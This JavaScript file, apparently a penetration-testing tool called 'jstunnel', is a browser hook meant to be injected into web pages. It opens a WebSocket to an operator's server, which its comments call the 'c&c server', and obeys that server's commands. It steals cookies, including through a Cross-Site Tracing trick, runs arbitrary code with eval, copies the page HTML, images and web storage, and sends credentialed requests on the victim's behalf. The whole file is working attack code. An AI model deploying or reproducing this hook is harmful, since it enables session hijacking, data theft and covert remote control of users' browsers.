"use strict";

// create class
var ERNW = window.ERNW = {};
var jstunnel = ERNW.jstunnel = {};

jstunnel.version = '0.0.1';

// enable debug mode (alerts and console logging)
jstunnel._debugws = true;

// event handlers
jstunnel.on = function(el, name, callback) {
    if(name.indexOf('on') != 0)
        name = 'on' + name;

    if(el.attachEvent) {
        el.attachEvent(name, callback);
    } else {
        if(el[name]) {
            var oldhandler = el[name];
            el[name] = function(event) {
                oldhandler(event);
                callback(event);
            };
        } else {
            el[name] = callback;
        }
    }
};

// initialise jstunnel
// @param wsurl WebSocket URL to connect to
jstunnel.init = function(wsurl) {

    var session = new jstunnel.Session(wsurl,
            function() {
                // send welcome message to server, including current url
                var welcome = {
                    'command' : 'welcome',
                    'data' : {'url' : window.location.href}
                };
                session.send(welcome);
            },
            function() { }
                // connection was closed
            );

    // initialise a tunnel
    var tunnel = new jstunnel.Tunnel('foo', session);
};

// Class for tunneling js requests`
jstunnel.Tunnel = function(target, session) {
    var self = this;

    self._target = target;
    self._session = session;



    // handle websocket messages
    self._session._websocket.onmessage = function (e) {
        var o = JSON.parse(e.data);
        if(o.command == 'welcome') {
            // save assigned id
            self._id = o.data;
        }
        else if(o.command == 'request') {
            // do a request
            var d = o.data;
            self.request(d.method, d.url, d.headers, d.body);
        } else if(o.command == 'alert') {
            // show an alert box
            alert(o.data);
        } else if(o.command == 'prompt') {
            // show a prompt and return result
            var resp = prompt(o.data.msg);
            self.send('prompt', resp, o.req_id);
        } else if(o.command == 'cookie') {
            // collect cookies from current side
            var cookies = document.cookie;
            try {
                // try XST
                var xhr = jstunnel.Tunnel._createCORS();

                try {
                    xhr.open("TRACE", location.href, false);
                    xhr.send();
                } catch(e) {
                    // try IE bug
                    xhr.open("\r\nTRACE", location.href, false);
                    xhr.send();
                }


                var trace_cookies = xhr.responseText.match(/Cookie: (.*)/);

                if(trace_cookies)
                    cookies += ";" + trace_cookies;
            } catch(e) {
                // can't run XST
            }
    
            // send collected cookies
            self.send('cookie', cookies, o.req_id);
        } else if(o.command == 'execute') {
            // execute supplied javascript and return result
            try {
                var resp = eval(o.data);
            } catch(e) {
                // exception occured during execution
                var resp = {"exception" : e, "message" : e.toString()};
            }
            self.send('execute', resp, o.req_id);
        } else if(o.command == 'view') {
            // possible screenshot functionality:
            // http://html2canvas.hertzen.com/build/html2canvas.js

            // collect images
            var imgs = {};
            var imgelems = document.getElementsByTagName('img');
            for(var i = 0; i < imgelems.length; i++)
                try {
                    imgs[imgelems[i].src] = getBase64Image(imgelems[i]);
                } catch(e) {
                    // can't get image data (maybe same origin policy)
                    imgs[imgelems[i].src] = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8CAIAAAC1nk4lAAAAo0lEQVRo3u3XMQoAMQhE0XHvf2e3CYQE3XYd+LZBeKTyh/rJ/HhUhP7aDTux1KAni2v0cHGBni++0RbiA+0i3mgj8UJ7iSWFnVjSYyfO7NFjxe1PTxbX6OHiAj1ffKMtxAfaRbzRRuKF9hK3ETD9iqIRaUQakUakEWlEGpFGpBFpRBqRRqQRaUQakUakEWlEGpFGpBFpRBqRRqQRaUQakUa85gUzhmhhbqRBtAAAAABJRU5ErkJggg==';
                }
            
            // send all data to the server
            var data = {
                'html' : document.documentElement.outerHTML,
                'images' : imgs
            };
            self.send('view', data, o.req_id);
        } else if(o.command == 'storage') {
            // read local storage
            if(o.data == 'local')
                self.send('storage', localStorage, o.reg_id);
            // read session storage
            else if(o.data == 'session')
                self.send('storage', sessionStorage, o.reg_id);
        }
    };
};

// create a XMLHttpRequest with credentials enabled
jstunnel.Tunnel._createCORS = function() {
    var ref = null;
    if (window.XMLHttpRequest) {
        ref = new XMLHttpRequest();
    } else if (window.ActiveXObject) { // Older IE.
        ref = new ActiveXObject("MSXML2.XMLHTTP.3.0");
    }
    ref.withCredentials = true;
    return ref;
};

// send a request to another server
// @param method HTTP Method to use
// @param url URL to request
// @param headers additional headers to send
// @param body additional (POST) body to send
jstunnel.Tunnel.prototype.request = function(method, url, headers, body) {
    var self = this;
    var _xhr = jstunnel.Tunnel._createCORS();

    _xhr.onload = function() {
        // collect available headers
        var headerstr = _xhr.getAllResponseHeaders();
        var headerlines = headerstr.split("\r\n");
        var headers = {};
        for(var i = 0; i < headerlines.length; i++) {
            var header = headerlines[i].split(": ");
            if(typeof headers[header[0]] != 'undefined') {
                header[header[0]].append(header[1]);
            } else {
                headers[header[0]] = [header[1]];
            }
        }
        
        // collect containing images
        var win = window.content || window.window;
        var tmpdiv = win.document.createElement('div');
        tmpdiv.innerHTML = _xhr.responseText;
        var imgs = {};
        var imgelems = tmpdiv.getElementsByTagName('img');
        for(var i = 0; i < imgelems.length; i++)
            try {
                imgs[imgelems[i].src] = getBase64Image(imgelems[i]);
            } catch(e) { // image not accessible (maybe same origin policy)
                imgs[imgelems[i].src] = imgelems[1].src;//'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8CAIAAAC1nk4lAAAAo0lEQVRo3u3XMQoAMQhE0XHvf2e3CYQE3XYd+LZBeKTyh/rJ/HhUhP7aDTux1KAni2v0cHGBni++0RbiA+0i3mgj8UJ7iSWFnVjSYyfO7NFjxe1PTxbX6OHiAj1ffKMtxAfaRbzRRuKF9hK3ETD9iqIRaUQakUakEWlEGpFGpBFpRBqRRqQRaUQakUakEWlEGpFGpBFpRBqRRqQRaUQakUa85gUzhmhhbqRBtAAAAABJRU5ErkJggg==';
            }

        // send all data to server
        var data = {
            'headers' : headers,
            'body': _xhr.responseText,
            'images' : imgs,
            'url': url
        };
        self.send('request', data);
    };

    _xhr.onerror = function(e) {
        var str = '';
        for(var name in e) {
            str += name + '=' + e[name] + '\n';
        }
        self.send('request', {'body':'error occured: ' + str, 'headers':{}, 'images':{}, 'url':url});
    };
    
    if(!jstunnel._debugws)
        _xhr.onerror = _xhr.onload;

    _xhr.open(method, url, true);
    if(headers) {
        for(var h in headers) {
            for(var i = 0; i < headers[h].length; i++)
                _xhr.setRequestHeader(h, headers[h][i]);
        }
    }
    _xhr.send(body);
};

// send data to the c&c server
// @param command to which the data belongs to
// @param data the data to send
// @param req_id the request id which initiated the current command
jstunnel.Tunnel.prototype.send = function(command, data, req_id) {
    var self = this;
    data = {
        'command' : command,
        'data' : data,
        'req_id' : req_id
    };

    // add the client id if available
    if(self._id && typeof data == 'object') {
        data.id = self._id;
    }
    self._session.send(data);
}

// some constants
jstunnel.CONNECTION_CLOSED = 0;
jstunnel.CONNECTION_LOST = 1;
jstunnel.CONNECTION_RETRIES_EXCEEDED = 2;
jstunnel.CONNECTION_UNREACHABLE = 3;
jstunnel.CONNECTION_UNSUPPORTED = 4;
jstunnel.CONNECTION_UNREACHABLE_SCHEDULED_RECONNECT = 5;
jstunnel.CONNECTION_LOST_SCHEDULED_RECONNECT = 6;

// create a websocket connection
jstunnel._construct = function (url, protocols) {
   if ("WebSocket" in window) {
      // Chrome, MSIE, newer Firefox
      if (protocols) {
         return new WebSocket(url, protocols);
      } else {
         return new WebSocket(url);
      }
   } else if ("MozWebSocket" in window) {
      // older versions of Firefox prefix the WebSocket object
      if (protocols) {
         return new MozWebSocket(url, protocols);
      } else {
         return new MozWebSocket(url);
      }
   } else {
      return null;
   }
};

// class for websocket connections
// @param wsuri WebSocket URL to connect to
// @param onopen callback for opened connections
// @param onclose callback for closed connections
// @param options additional options
jstunnel.Session = function (wsuri, onopen, onclose, options) {

   var self = this;

   self._wsuri = wsuri;
   self._options = options;
   self._websocket_onopen = onopen;
   self._websocket_onclose = onclose;

   self._websocket = null;
   self._websocket_connected = false;

   self._session_id = null;
   self._server = null;

   self._txcnt = 0;
   self._rxcnt = 0;

   //if (self._options && self._options.skipSubprotocolAnnounce) {
      self._websocket = jstunnel._construct(self._wsuri);
   /*} else {
      self._websocket = jstunnel._construct(self._wsuri, [jstunnel._subprotocol]);
   }*/

   // open connection if not already done
   if (!self._websocket) {
      if (onclose !== undefined) {
         onclose(jstunnel.CONNECTION_UNSUPPORTED);
         return;
      } else {
         throw "Unsupported Browser";
      }
   }

   // default message handler for debugging proposes
   self._websocket.onmessage = function (e)
   {
      if (jstunnel._debugws) {
         self._rxcnt += 1;
         console.group("WS Receive");
         console.info(self._wsuri + " [" + self._session_id + "]");
         console.log(self._rxcnt);
         console.log(e.data);
         console.groupEnd();
      }
      var o = JSON.parse(e.data);
   };

   // handler for opened connections
   self._websocket.onopen = function (e)
   {
      if (jstunnel._debugws) {
         console.group("WS Connect");
         console.info(self._wsuri);
         console.groupEnd();
      }
      self._websocket_connected = true;

      // call supplied handler
      if (self._websocket_onopen !== null) {
         self._websocket_onopen();
      }
   };

   self._websocket.onerror = function (e)
   {
      // FF fires this upon unclean closes
      // Chrome does not fire this
   };

   self._websocket.onclose = function (e)
   {
      if (jstunnel._debugws) {
         if (self._websocket_connected) {
            console.log("JSTunnel connection to " + self._wsuri + " lost (code " + e.code + ", reason '" + e.reason + "', wasClean " + e.wasClean + ").");
         } else {
            console.log("JSTunnel could not connect to " + self._wsuri + " (code " + e.code + ", reason '" + e.reason + "', wasClean " + e.wasClean + ").");
         }
      }

      // fire app callback
      if (self._websocket_onclose !== undefined) {
         if (self._websocket_connected) {
            if (e.wasClean) {
               // connection was closed cleanly (closing HS was performed)
               self._websocket_onclose(jstunnel.CONNECTION_CLOSED, "WS-" + e.code + ": " + e.reason);
            } else {
               // connection was closed uncleanly (lost without closing HS)
               self._websocket_onclose(jstunnel.CONNECTION_LOST);
            }
         } else {
            // connection could not be established in the first place
            self._websocket_onclose(jstunnel.CONNECTION_UNREACHABLE);
         }
      }

      // cleanup - reconnect requires a new session object!
      self._websocket_connected = false;
      self._wsuri = null;
      self._websocket_onopen = null;
      self._websocket_onclose = null;
      self._websocket = null;
   };
};

// send message to WebSocket Server
// encodes msg into json
// @param msg message to send
jstunnel.Session.prototype.send = function (msg) {

   var self = this;

   if (!self._websocket_connected) {
      throw "Tunnel not connected";
   }

   var rmsg = JSON.stringify(msg);
   self._websocket.send(rmsg);
   self._txcnt += 1;

   if (jstunnel._debugws) {
      console.group("WS Send");
      console.info(self._wsuri + " [" + self._session_id + "]");
      console.log(self._txcnt);
      console.log(rmsg);
      console.groupEnd();
   }
};

// close connection
jstunnel.Session.prototype.close = function () {
   var self = this;
   if (self._websocket_connected) {
      self._websocket.close();
   } else {
   }
};

// get sessionid
jstunnel.Session.prototype.sessionid = function () {
   var self = this;
   return self._session_id;
};

// try to connect to a server specified in the class attribute of the script tag
jstunnel.on(window, 'load', function() {
    var scripts = document.body.getElementsByTagName('script');
    for(var i = 0; i < scripts.length; i++) {
        var params = scripts[i].classList;
        if(params) {
            jstunnel.init.apply(window, params);
        }
    }
});

// read image data into base64 string
function getBase64Image(img) {
    // Create an empty canvas element
    var canvas = document.createElement("canvas");
    canvas.width = img.width;
    canvas.height = img.height;

    // Copy the image contents to the canvas
    var ctx = canvas.getContext("2d");
    ctx.drawImage(img, 0, 0);

    // Get the data-URL formatted image
    // Firefox supports PNG and JPEG. You could check img.src to
    // guess the original format, but be aware the using "image/jpg"
    // will re-encode the image.
    var dataURL = canvas.toDataURL("image/png");

    return dataURL; // no need to strip header atm

    return dataURL.replace(/^data:image\/(png|jpg);base64,/, "");
}
